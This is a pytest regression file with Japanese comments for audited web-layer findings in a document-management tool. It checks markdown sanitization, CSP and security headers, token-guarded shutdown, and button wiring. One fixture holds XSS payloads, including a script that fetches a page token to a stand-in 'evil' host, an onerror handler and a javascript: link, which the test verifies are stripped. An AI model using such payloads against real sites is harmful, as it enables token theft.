"""監査で確定した Web 層 finding（XSS・ヘッダ・ボタンガード）の再現・回帰テスト。"""

from pathlib import Path

import pytest

pytest.importorskip("fastapi")
pytest.importorskip("markdown")
from fastapi.testclient import TestClient  # noqa: E402

from docsweep.config import load_config  # noqa: E402
from docsweep.server.app import create_app  # noqa: E402

TOKEN = "test-token-xyz"


def _client(root: Path):
    cfg = load_config(explicit_roots=[str(root)], global_path=root / "no.yaml")
    return TestClient(create_app(cfg, token=TOKEN))


# ---- [01][02][25]: 信頼できない .md のプレビューがサニタイズされる ----

def test_preview_sanitizes_untrusted_markdown(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_evil.md").write_text(
        "# [計画] わな\n\n安全本文マーカー\n\n"
        '<script>fetch("//evil/"+document.body.dataset.token)</script>\n'
        '<img src=x onerror="alert(1)">\n'
        "[クリック](javascript:alert(2))\n",
        encoding="utf-8",
    )
    c = _client(root)
    p = (root / "proj" / "plan_evil.md").resolve().as_posix()
    r = c.get("/preview", params={"token": TOKEN, "path": p})
    assert r.status_code == 200
    body = r.text.lower()
    assert "安全本文マーカー" in r.text     # 正規の本文は描画される
    assert "<script" not in body            # script 除去
    assert "onerror" not in body            # イベントハンドラ除去
    assert "javascript:" not in body        # 危険スキーム除去


# ---- F-B/[40]: 防御ヘッダ（Referer 漏れ・MIME スニッフィング対策）----

def test_security_headers_present(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    r = c.get(f"/?token={TOKEN}")
    assert r.headers.get("referrer-policy") == "no-referrer"
    assert r.headers.get("x-content-type-options") == "nosniff"


# ---- [21][22]: needs_fix カードに 400 確定のボタン/属性を出さない ----

def test_needs_fix_card_has_no_dead_buttons(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    # 未知ラベル → parse_error → needs_fix（state=None, allowed_actions=['keep']）。
    (root / "proj" / "plan_broken.md").write_text("# [ナニコレ] こわれた\n", encoding="utf-8")
    c = _client(root)
    html = c.get(f"/?token={TOKEN}").text
    assert "plan_broken.md" in html       # カード自体は出る
    assert "relabel" not in html          # 保留(relabel)ボタンは出ない
    assert "data-arch" not in html        # 一括 archive 対象にもならない


# ---- [11][13]: パスにシングルクオートを含んでも安全に配線される（data 属性 + 委譲）----

def test_apostrophe_path_renders_safe(tmp_path: Path):
    root = tmp_path / "dev"
    d = root / "bob's-proj"
    d.mkdir(parents=True)
    (d / "plan_stale.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    import os
    import time
    old = time.time() - 200 * 86400
    os.utime(d / "plan_stale.md", (old, old))
    c = _client(root)
    html = c.get(f"/?token={TOKEN}").text
    assert "onclick=" not in html            # inline ハンドラは廃止（CSP 対応）
    assert "bob&#39;s-proj" in html          # path は data 属性に autoescape されて入る
    # 2026-06-23 改修: 「廃止」独立ボタンを撤去（変更▾ピッカーに集約）。CSP 配線確認は
    # 「変更▾」ボタンの data-action で代替する（同じ委譲方式）。
    assert 'data-action="open-change-picker"' in html


# ---- CSP + inline ハンドラ撤廃（多層防御）----

def test_csp_and_no_inline_handlers(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    r = c.get(f"/?token={TOKEN}")
    csp = r.headers.get("content-security-policy", "")
    assert "script-src 'self'" in csp        # inline/注入 script を遮断
    assert "default-src 'none'" in csp
    assert "onclick=" not in r.text          # ダッシュボードに inline ハンドラなし


# ---- ⏻ shutdown エンドポイント（画面右上ボタンから呼ばれる）----

def test_shutdown_requires_token(tmp_path: Path):
    """token 無し / 偽物では拒否する（任意リクエストでサーバーを落とされたら困る）。"""
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    assert c.post("/api/shutdown").status_code == 403
    assert c.post("/api/shutdown", data={"token": "WRONG"}).status_code == 403


def test_shutdown_without_server_returns_503(tmp_path: Path):
    """TestClient 経由（uvicorn.Server を持たない）では落とせないので 503 を返す。"""
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    r = c.post("/api/shutdown", data={"token": TOKEN})
    assert r.status_code == 503


def test_shutdown_sets_should_exit(tmp_path: Path):
    """uvicorn.Server を差し込んだ状態では POST /api/shutdown が should_exit=True にする。"""
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    from docsweep.config import load_config
    from docsweep.server.app import create_app
    cfg = load_config(explicit_roots=[str(root)], global_path=root / "no.yaml")
    app = create_app(cfg, token=TOKEN)

    class _FakeServer:
        should_exit = False

    fake = _FakeServer()
    app.state.docsweep.server = fake
    c = TestClient(app)
    r = c.post("/api/shutdown", data={"token": TOKEN})
    assert r.status_code == 200
    assert r.json() == {"shutting_down": True}
    assert fake.should_exit is True


def test_board_has_shutdown_and_settings_buttons(tmp_path: Path):
    """画面右上に ⏻ サーバー停止ボタンと ⚙ 設定ボタンが両方出ている。
    配置・配線（data-action）まで確認する（many-ai-cli と同じ並びを維持する保証）。"""
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    html = c.get(f"/board?token={TOKEN}").text
    assert 'id="shutdown-btn"' in html
    assert 'data-action="shutdown-server"' in html
    assert 'id="settings-btn"' in html
    assert 'data-action="open-settings"' in html
    # 古い「⚙ 設定」テキストだけのボタンは置換済みであること（SVG 化）。
    assert ">⚙ 設定<" not in html
